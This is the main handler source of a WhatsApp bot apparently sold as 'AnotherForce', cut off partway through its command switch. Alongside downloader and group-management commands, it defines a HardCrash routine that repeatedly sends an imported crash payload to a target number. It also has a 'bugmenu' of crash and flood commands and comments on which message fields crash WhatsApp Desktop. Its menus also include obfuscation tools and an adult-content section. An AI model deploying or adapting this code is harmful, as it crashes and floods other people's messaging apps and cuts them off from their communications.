
require('./config')
const {
	drayyyConnect,
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys")
const fs = require('fs')
const path = require('path');
const jimp = require('jimp');
const chalk = require('chalk');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const search = require ("yt-search");
const { youtube } = require("btch-downloader");
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const JsConfuser = require('js-confuser');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const axios = require('axios')
const util = require('util')
const { y2mateplay, y2matemp3, y2matemp4 } = require('./penyimpanan/lib/y2mate')
const { pinterest, pinterest2, remini, mediafire, tiktokDl , spotifyDl , searchSpotifyTracks, convertDuration, convertAngka, ytdl, tiktokSearchVideo, text2img, listModels, getModels, listSampler, pickRandom, getJobs, spotifyDown, rsz } = require('./penyimpanan/lib/scraper');
const { NativeCrl_Gen2 } = require('./DrayFunc');

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function capital(string) {
return string.charAt(0).toUpperCase() + string.slice(1);
}


//=================================================//
module.exports = drayyy = handler = async (drayyy, m, chatUpdate, store) => {
	try {
	
		const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./penyimpanan/lib/myfunc.js');
		const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./penyimpanan/lib/converter');
		const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./penyimpanan/lib/uploader');
    //=================================================//
		var body = (
			m.mtype === 'conversation' ? m.message.conversation :
			m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
			m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
			m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
			m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
			m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
			m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
			m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
			m.mtype === 'messageContextInfo' ?
			m.message.buttonsResponseMessage?.selectedButtonId ||
			m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
			m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
			m.text :
			''
			);
		if (body == undefined) { body = '' };
		var budy = (typeof m.text == "string" ? m.text : "");
    //=================================================//
		//command
		const from = m.key.remoteJid
		const prefixRegex = /[.!#÷×/]/;
		const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : null;
		const isCmd = prefix ? body.startsWith(prefix) : false;
		const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';		
		const args = budy.trim().split(/ +/).slice(1);
		const q = text = args.join(' ')

		// Individual
		const makeid = crypto.randomBytes(3).toString('hex')
		const contacts = JSON.parse(fs.readFileSync("./penyimpanan/database/ctcs.json"))
		const botNumber = await drayyy.decodeJid(drayyy.user.id)
		const pushname = m.pushName || "No Name";
		const senderNumber = m.sender.split('@')[0];	
		const owners = JSON.parse(fs.readFileSync("./penyimpanan/database/own.json"))
		const itsMe = m.sender == botNumber;
		const isOwner = [botNumber.split('@')[0], ...global.owner].includes(m.sender.split("@")[0]) ? true : owners.includes(m.sender) ? true : false
			const isCreator = [botNumber.split('@')[0], ...global.owner].includes(m.sender.split("@")[0]) ? true : owners.includes(m.sender) ? true : false
		if (!drayyy.public) {
			if (!m.fromMe && !isOwner) return;
		};

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

		// Group
       const remoteJid = m.key.remoteJid
       const itil = String.fromCharCode(8206)
	   const readmore = itil.repeat(4001)
		const isGroup = m.chat.endsWith('@g.us');
		const groupMetadata = isGroup ? await drayyy.groupMetadata(m.chat).catch(e => {}) : '';
		const groupName = isGroup ? groupMetadata.subject : '';
		const groupMembers = isGroup ? groupMetadata.participants : '';
		const groupAdmins = isGroup ? await getGroupAdmins(groupMembers) : '';
		const isBotAdmin = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') : false;
		const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
		const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
		const groupOwner = isGroup ? groupMetadata.owner : '';
		const prem = JSON.parse(fs.readFileSync('./penyimpanan/database/prem.json'))	
		
	const unli = JSON.parse(fs.readFileSync("./penyimpanan/database/unli.json"))

const saldo = JSON.parse(fs.readFileSync("./penyimpanan/database/saldo.json"));
let db_saldo = JSON.parse(fs.readFileSync("./penyimpanan/database/saldo.json"));
const { bugdray4, bugios } = require("./penyimpanan/lib/snap")
		const isPrem = prem.includes(m.sender)
		
		const isPremium = prem.includes(m.sender)
		const isUnli = unli.includes(m.chat)
		const reseller = JSON.parse(fs.readFileSync('./penyimpanan/database/reseller.json'))		
		const isReseller = reseller.includes(m.sender)
		
		const isGroupOwner = isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false;

		//msg & imgs
		const isMedia = (m.type === 'imageMessage' || m.type === 'videoMessage')
		const fatkuns = (m.quoted || m)
		let quoted;
try {
    if (fatkuns && typeof fatkuns === 'object') {
        if (fatkuns.mtype === "buttonsMessage") {
            const keys = Object.keys(fatkuns);
            quoted = fatkuns[keys[1]];
        } else if (fatkuns.mtype === "templateMessage" && fatkuns.hydratedTemplate) {
            const keys = Object.keys(fatkuns.hydratedTemplate);
            quoted = fatkuns.hydratedTemplate[keys[1]];
        } else if (fatkuns.mtype === "product") {
            const keys = Object.keys(fatkuns);
            quoted = fatkuns[keys[0]];
        } else {
            quoted = m.quoted ? m.quoted : m;
        }
    } else {
        quoted = m.quoted ? m.quoted : m;
    }
} catch (err) {
    console.error("❌ Error parsing quoted message:", err.message);
    quoted = m.quoted ? m.quoted : m;
}
		let qmsg = {};
try {
    if (quoted && typeof quoted === 'object') {
        qmsg = quoted.msg ? quoted.msg : quoted;
    }
} catch (e) {
    console.error("❌ Failed to parse quoted.msg:", e.message);
    qmsg = {};
}
const mime = qmsg?.mimetype || "";
		
// Pencarian gambar video
const foto = fs.readFileSync('./another/Xynz.jpg')
const mintak = fs.readFileSync('./another/Xynz.jpg')   
const ppuser = fs.readFileSync('./another/hello.jpeg')
const marah = fs.readFileSync('./another/marah.jpeg')    
const sadbor = fs.readFileSync('./another/another.mp3')    
const almiratobrut = "https://files.catbox.moe/ah4iqu.mp3"
		//time
		const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
		let ucapanWaktu;
		if (time >= "19:00:00" && time < "23:59:00") {
			ucapanWaktu = "夜 🌌";
		} else if (time >= "15:00:00" && time < "19:00:00") {
			ucapanWaktu = "午後 🌇";
		} else if (time >= "11:00:00" && time < "15:00:00") {
			ucapanWaktu = "正午 🏞️";
		} else if (time >= "06:00:00" && time < "11:00:00") {
			ucapanWaktu = "朝 🌁";
		} else {
			ucapanWaktu = "夜明け 🌆";
		}
		const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z");
		const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z");
		const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z");
		const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
		let d = new Date();
		let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime();
		let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5];
		let week = d.toLocaleDateString("id", { weekday: "long" });
		let calendar = d.toLocaleDateString("id", {
			day: "numeric",
			month: "long",
			year: "numeric"
		});		

//UCAPAN WAKTU
function getGreeting() {
const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Good Morning 🌆";
  } else if (hours >= 12 && hours < 18) {
    return " Good Afternoon 🌇";
  } else {
    return "Good Night 🌌";
  }
}
const greeting = getGreeting();
//END UCAPAN WAKTU

        //function
const {
    NativeCrl_Gen2
    } = require("./DrayFunc.js")
async function HardCrash(target) {
let counter = 0; // Hitungan iterasi
for (let r = 0; r < 10; r++) {
await NativeCrl_Gen2(drayyy, target);
 counter++; // Tambah 1 tiap loop selesai
 console.log(chalk.red(`${counter} ${chalk.blue("Bug Berhasil Terkirim...")}`));
 await sleep(1000); 
    }    
}

        //quoted
		const ctt = {
			key: {
				remoteJid: '0@s.whatsapp.net', // 'status@broadcast', menggunakan remote jid bernilai 'statusbroadcast' akan menyebabkan pesan crash pada wa desktop. sebagai alternatif, saya menggunakan nilai '0@s.whatsapp.net'
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				contactMessage: {
					displayName: (pushname),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
				}
			}
		};

		const callg = {
			key: {
				remoteJid: 'status@broadcast', //'0@s.whatsapp.net', menggunakan remote jid bernilai 'statusbroadcast' akan menyebabkan pesan crash pada wa desktop. sebagai alternatif, sebaiknya menggunakan nilai '0@s.whatsapp.net'
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }]
                }
			}
		};
   

const qbugz = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `-𝑨𝒏𝒐𝒕𝒉𝒆𝒓 𝑭𝒐𝒓𝒄𝒆 𝑮𝒆𝒏 3-`,jpegThumbnail: foto}}}
	// Pengiriman Quoted Fake Lokasi Dengan Thumb //
//quoted random
const rdmtks = ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
const rdmq = rdmtks[Math.floor(Math.random() * rdmtks.length)];
      const qmime = {key: {participant: rdmq, ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `-𝑨𝒏𝒐𝒕𝒉𝒆𝒓 𝑭𝒐𝒓𝒄𝒆 𝑮𝒆𝒏 3-`,jpegThumbnail: await rsz(foto, 200, 200) }}}
	// Pengiriman Quoted Fake Broadcast Gif Dengan Thumb PP Sender //
	const qgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title": 'drayyybot', "h": 'drayyy','seconds': '359996400', 'gifPlayback': 'true', 'caption': 'drayyybot', 'jpegThumbnail': mintak}}}
	// Pengiriman Quoted Fake Live Lokasi V2 //
      const qctc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `Sc drayyybot BY t.me/drayoffc`,jpegThumbnail: ""}}}
	// Pengiriman Quoted Fake Permintaan Bayaran //
        const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso8583: "BRL", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "drayyybot | t.me/drayoffc"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 7777, currencyCode: "BRL"}}}}
	// Pengiriman Quoted Fake Produk Troli //
	const qtroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2024,status: 200, thumbnail: ppuser, surface: 200, message: `𝐀𝐧𝐨𝐭𝐡𝐞𝐫↯`, orderTitle: 't.me/xdrayyy', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
    // Pengiriman Fake Audio //
    const qVoice = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}}}
	// Pengiriman Quoted Fake Lokasi Runtime //       
        const qjpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `々 | 🔴 -𝑨𝒏𝒐𝒕𝒉𝒆𝒓-: ${runtime(process.uptime())}`,jpegThumbnail: mintak}}}
	// Pengiriman Quoted Fake Custom Text //
	const qText = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "drayyybot By t.me/drayoffc"}}}
		
        const nullgb = {
        key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
            },
            message: {
            documentMessage: {
                contactVcard: true
              }
            }
        };
    
 // Random Reply //
 const reply = (teks) => {
            drayyy.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `-𝑨𝒏𝒐𝒕𝒉𝒆𝒓 𝑭𝒐𝒓𝒄𝒆 𝑮𝒆𝒏 𝟑-`,
            "body": `© 𝐷𝑟𝑎𝑦𝑋𝐷`,
            "previewType": "PHOTO",
            "thumbnailUrl": `Bít.ly/Drãyganz`,
            "thumbnail": fs.readFileSync('./another/rep.jpeg'),
            "sourceUrl": `https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L`
        }
    }
},
{ quoted: qmime })
        }
 
 async function databaserep(teks) {
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© 𝑨𝒏𝒐𝒕𝒉𝒆𝒓-3.0"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/message/RUMQLIHULQ7FE1\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qmime}) 
await drayyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})	
}


    
        
        // const q //
		const sendReact = async (emote) => {
        drayyy.sendMessage(remoteJid, {
          react: {
            text: emote,
            key: m.key,
          },
        })
      }
        
const dbreply = (teks) => { 
drayyy.sendMessage(m.chat, { react: { text: "❗",key: m.key,}}); 
databaserep(teks)
    }   
        
        
const nomerCreator =
[
'6283891457614@s.whatsapp.net',
'62895329431063@s.whatsapp.net',
'6283151568511@s.whatsapp.net',
'6285183386864@s.whatsapp.net',
'6285117248511@s.whatsapp.net'
]

		const qstore = {
   key: {
      fromMe: false,
     participant: `0@s.whatsapp.net`,
   ...(m.chat ? {
         remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": foto,
},
"title": `-𝑨𝒏𝒐𝒕𝒉𝒆𝒓 𝑭𝒐𝒓𝒄𝒆 𝑮𝒆𝒏 3-`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "999999999",
"retailerId": ` drayyyner `,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const locq = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: ` ⽶ `,jpegThumbnail: ""}}}

if (isCmd) {
    console.log(`
${chalk.inverse('ANOTHER')}  ${chalk.inverse(` ${new Date().toLocaleString()} `)}

${chalk.magenta.bold('╭─ > From:')}      ${chalk.green.bold(pushname || 'Unknown')} ${chalk.yellow(`(${m.sender})`)}
${chalk.magenta.bold('├─ > In:')}        ${chalk.cyan.bold(m.isGroup ? 'Group Chat' : 'Private Chat')} ${chalk.gray(from)}
${chalk.magenta.bold('╰─ > Message:')}   ${chalk.white.bold(budy || m.mtype)}

${chalk.redBright('╭────────────────────────────────────────────╮')}
${chalk.redBright('│          AnotherForce | © DrayXD           │')}
${chalk.redBright('╰────────────────────────────────────────────╯')}
    `);
}
//=================================================//
		switch (command) {

 case 'menu': 
 case 'help': 
 case 'another': {

await drayyy.sendMessage(m.chat, { react: { text: "✨",key: m.key,}}); 
let teksnya = `
╭━⧽『 ⽍ 𝑰𝑵𝑭𝑶 𝑨𝑩𝑶𝑼𝑻 𝑩𝑶𝑻 ⽕ 』
│ み 𝐎𝐰𝐧𝐞𝐫 : ${global.ownername}
│ み 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : DrayXD Official
│ み 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : AnotherForce
│ み 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 3.0
│ み 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
╰────────────⟢
╭━⧽『 ⽍ 𝐒𝐄𝐋𝐄𝐂𝐓 𝐌𝐄𝐍𝐔 ⽕ 』
│ み .allmenu
│ み .bugmenu
│ み .toolsmenu
│ み .groupmenu
│ み .obfmenu
│ み .asupanmenu
│ み .ownermenu
╰────────────⟢`
await drayyy.sendMessage(m.chat, {image: foto,
    caption: teksnya, contextInfo: {
   isForwarded: true, 
   forwardingScore: 9999999,
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: "120363333973020520@newsletter",
   newsletterName: "𝑨𝒏𝒐𝒕𝒉𝒆𝒓𝑪𝒓𝒂𝒔𝒉 𝑮𝒆𝒏 𝟑"
   }}}, {quoted: qmime})
}
await sleep(1000)
await drayyy.sendMessage(m.chat, {audio: {url: almiratobrut}, mimetype: 'audio/mp4', ptt: true}, {quoted: m })
break

case 'bugmenu': {

await drayyy.sendMessage(m.chat, { react: { text: "✨",key: m.key,}}); 
let teksnya = `
╭━⧽『 ⽍ 𝑰𝑵𝑭𝑶 𝑨𝑩𝑶𝑼𝑻 𝑩𝑶𝑻 ⽕ 』
│ み 𝐎𝐰𝐧𝐞𝐫 : ${global.ownername}
│ み 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : DrayXD Official
│ み 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : AnotherForce
│ み 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 3.0
│ み 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
╰────────────⟢
╭━⧽『 ⽍ 𝐃𝐄𝐋𝐀𝐘 𝐁𝐔𝐆𝐒 ⽕ 』
│ み .invisix
│ み .dryx
│ み .mention-crash
│ み .flow-beta
│ み .firewall
│ み .force-system
│ み .crash-status
│ み .floods-crash
│ み .execution
│ み .python
╰────────────⟢
╭━⧽『 ⽍ 𝐁𝐋𝐀𝐍𝐊 𝐁𝐔𝐆𝐒 ⽕ 』
│ み .blank-stc 
│ み .super-crash
│ み .stuckapp
│ み .dinamica
│ み .galaxy-crash
╰────────────⟢`
await drayyy.sendMessage(m.chat, {image: foto,
    caption: teksnya, contextInfo: {
   isForwarded: true, 
   forwardingScore: 9999999,
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: "120363333973020520@newsletter",
   newsletterName: "𝑨𝒏𝒐𝒕𝒉𝒆𝒓𝑪𝒓𝒂𝒔𝒉 𝑮𝒆𝒏 𝟑"
   }}}, {quoted: qmime})
}
await sleep(1000)
await drayyy.sendMessage(m.chat, {audio: {url: almiratobrut}, mimetype: 'audio/mp4', ptt: true}, {quoted: m })
break

case 'toolsmenu': {

await drayyy.sendMessage(m.chat, { react: { text: "✨",key: m.key,}}); 
let teksnya = `
╭━⧽『 ⽍ 𝑰𝑵𝑭𝑶 𝑨𝑩𝑶𝑼𝑻 𝑩𝑶𝑻 ⽕ 』
│ み 𝐎𝐰𝐧𝐞𝐫 : ${global.ownername}
│ み 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : DrayXD Official
│ み 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : AnotherForce
│ み 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 3.0
│ み 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
╰────────────⟢
╭━⧽『 ⽍ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ⽕ 』
│ み .ig
│ み .ttmp3
│ み .tiktokmp3
│ み .tr
│ み .translate
│ み .stickerwm
│ み .wm
│ み .toaudio
│ み .tomp3
│ み .gpt
│ み .qc
│ み .play
│ み .spotify
│ み .playspotify
│ み .ytsearch
│ み .ttsearch
│ み .pin
│ み .pinterest
│ み .ytmp3
│ み .tiktok
│ み .bratsticker
│ み .mediafire
╰────────────⟢`
await drayyy.sendMessage(m.chat, {image: foto,
    caption: teksnya, contextInfo: {
   isForwarded: true, 
   forwardingScore: 9999999,
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: "120363333973020520@newsletter",
   newsletterName: "𝑨𝒏𝒐𝒕𝒉𝒆𝒓𝑪𝒓𝒂𝒔𝒉 𝑮𝒆𝒏 𝟑"
   }}}, {quoted: qmime})
}
await sleep(1000)
await drayyy.sendMessage(m.chat, {audio: {url: almiratobrut}, mimetype: 'audio/mp4', ptt: true}, {quoted: m })
break

case 'obfmenu': {

await drayyy.sendMessage(m.chat, { react: { text: "✨",key: m.key,}}); 
let teksnya = `
╭━⧽『 ⽍ 𝑰𝑵𝑭𝑶 𝑨𝑩𝑶𝑼𝑻 𝑩𝑶𝑻 ⽕ 』
│ み 𝐎𝐰𝐧𝐞𝐫 : ${global.ownername}
│ み 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : DrayXD Official
│ み 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : AnotherForce
│ み 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 3.0
│ み 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
╰────────────⟢
╭━⧽『 ⽍ 𝐎𝐁𝐅 𝐌𝐄𝐍𝐔 ⽕ 』
│ み .dec
│ み .decrypt
│ み .encrypt
│ み .encryptmed
│ み .encrypthard
╰────────────⟢`
await drayyy.sendMessage(m.chat, {image: foto,
    caption: teksnya, contextInfo: {
   isForwarded: true, 
   forwardingScore: 9999999,
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: "120363333973020520@newsletter",
   newsletterName: "𝑨𝒏𝒐𝒕𝒉𝒆𝒓𝑪𝒓𝒂𝒔𝒉 𝑮𝒆𝒏 𝟑"
   }}}, {quoted: qmime})
}
await sleep(1000)
await drayyy.sendMessage(m.chat, {audio: {url: almiratobrut}, mimetype: 'audio/mp4', ptt: true}, {quoted: m })
break

case 'groupmenu': {

await drayyy.sendMessage(m.chat, { react: { text: "✨",key: m.key,}}); 
let teksnya = `
╭━⧽『 ⽍ 𝑰𝑵𝑭𝑶 𝑨𝑩𝑶𝑼𝑻 𝑩𝑶𝑻 ⽕ 』
│ み 𝐎𝐰𝐧𝐞𝐫 : ${global.ownername}
│ み 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : DrayXD Official
│ み 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : AnotherForce
│ み 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 3.0
│ み 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
╰────────────⟢
╭━⧽『 ⽍ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 ⽕ 』
│ み .welcome on/off
│ み .antilink on/off
│ み .listgc
│ み .resetlinkgc
│ み .linkgc
│ み .tagall
│ み .hidetag
│ み .add
│ み .kick
│ み .leave
╰────────────⟢`
await drayyy.sendMessage(m.chat, {image: foto,
    caption: teksnya, contextInfo: {
   isForwarded: true, 
   forwardingScore: 9999999,
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: "120363333973020520@newsletter",
   newsletterName: "𝑨𝒏𝒐𝒕𝒉𝒆𝒓𝑪𝒓𝒂𝒔𝒉 𝑮𝒆𝒏 𝟑"
   }}}, {quoted: qmime})
}
await sleep(1000)
await drayyy.sendMessage(m.chat, {audio: {url: almiratobrut}, mimetype: 'audio/mp4', ptt: true}, {quoted: m })
break

case 'asupanmenu': {

await drayyy.sendMessage(m.chat, { react: { text: "✨",key: m.key,}}); 
let teksnya = `
╭━⧽『 ⽍ 𝑰𝑵𝑭𝑶 𝑨𝑩𝑶𝑼𝑻 𝑩𝑶𝑻 ⽕ 』
│ み 𝐎𝐰𝐧𝐞𝐫 : ${global.ownername}
│ み 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : DrayXD Official
│ み 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : AnotherForce
│ み 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 3.0
│ み 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
╰────────────⟢
╭━⧽『 ⽍ 𝐀𝐒𝐔𝐏𝐀𝐍 𝐌𝐄𝐍𝐔 ⽕ 』
│ み .bokep
│ み .18+
│ み .viral
│ み .asupanpagi
│ み .asupansore
│ み .asupanmalam
╰────────────⟢`
await drayyy.sendMessage(m.chat, {image: foto,
    caption: teksnya, contextInfo: {
   isForwarded: true, 
   forwardingScore: 9999999,
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: "120363333973020520@newsletter",
   newsletterName: "𝑨𝒏𝒐𝒕𝒉𝒆𝒓𝑪𝒓𝒂𝒔𝒉 𝑮𝒆𝒏 𝟑"
   }}}, {quoted: qmime})
}
await sleep(1000)
await drayyy.sendMessage(m.chat, {audio: {url: almiratobrut}, mimetype: 'audio/mp4', ptt: true}, {quoted: m })
break

case 'ownermenu': {

await drayyy.sendMessage(m.chat, { react: { text: "✨",key: m.key,}}); 
let teksnya = `
╭━⧽『 ⽍ 𝑰𝑵𝑭𝑶 𝑨𝑩𝑶𝑼𝑻 𝑩𝑶𝑻 ⽕ 』
│ み 𝐎𝐰𝐧𝐞𝐫 : ${global.ownername}
│ み 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : DrayXD Official
│ み 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : AnotherForce
│ み 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 3.0
│ み 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
╰────────────⟢
╭━⧽『 ⽍ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ⽕ 』
│ み .public
│ み .self
│ み .addown
│ み .delown
│ み .addmurbug
│ み .delmurbug
│ み .addgcmurbug
│ み .delgcmurbug
╰────────────⟢`
await drayyy.sendMessage(m.chat, {text: teksnya, contextInfo: {
   isForwarded: true, 
   forwardingScore: 9999999,
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: "120363333973020520@newsletter",
   newsletterName: "𝑨𝒏𝒐𝒕𝒉𝒆𝒓𝑪𝒓𝒂𝒔𝒉 𝑮𝒆𝒏 𝟑"
   }}}, {quoted: qmime})
}
await sleep(1000)
